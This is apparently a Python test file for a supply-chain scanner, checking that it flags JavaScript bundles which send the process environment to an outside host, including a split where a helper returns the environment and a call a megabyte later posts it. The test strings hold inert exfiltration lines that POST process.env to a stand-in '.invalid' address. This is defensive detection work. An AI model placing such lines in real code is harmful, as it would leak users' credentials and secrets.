"""BIG-BUNDLE-TAIL (0.1.9): an exfiltration split across a bundle past 2,000,000 characters, a helper that returns the
environment in one module and the call that sends it a megabyte later, is found by the supply-chain tree, which reads
the bundle whole now (the text follower, which read it before, read a text's first 5,000 assignments, 100 returns and
200 calls, quietly); and a send at the bundle's end through the action scan.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.scanner import core
from tests.registry import _bundle_support as bb

SEND = 'fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });\n'
HELPER = "exports.diag = function diag() { const all = JSON.stringify(process.env); return all; };\n"
CALL = ('const core = __nccwpck_require__(9001);\n(async () => {\n'
        '  await fetch("https://c.invalid/x", { method: "POST", body: core.diag() });\n})();\n')


def risk(text):
    reasons, line = core.import_time_risk(text, "js")
    return reasons, (text.split("\n")[line - 1] if line else None)


class SplitTests(unittest.TestCase):
    def test_split_a_helper_returns_it_and_a_call_a_megabyte_later_sends_it(self):
        text = bb.bundle(code=CALL, at=0.48, helper=HELPER)
        self.assertGreater(text.index("core.diag()") - text.index("exports.diag"), 950_000)
        reasons, line = risk(text)
        self.assertEqual(reasons, [bb.HARVEST])
        self.assertIn("core.diag()", line)

    def test_through_the_action_scan(self):
        verdict, issues = bb.action_issues(bb.bundle(main="  " + SEND))
        self.assertEqual(verdict, "SUSPICIOUS")
        self.assertEqual([(r, s) for r, s, _ in issues], [("SC-IMPORT-RISK", "CRITICAL")])


if __name__ == "__main__":
    unittest.main()
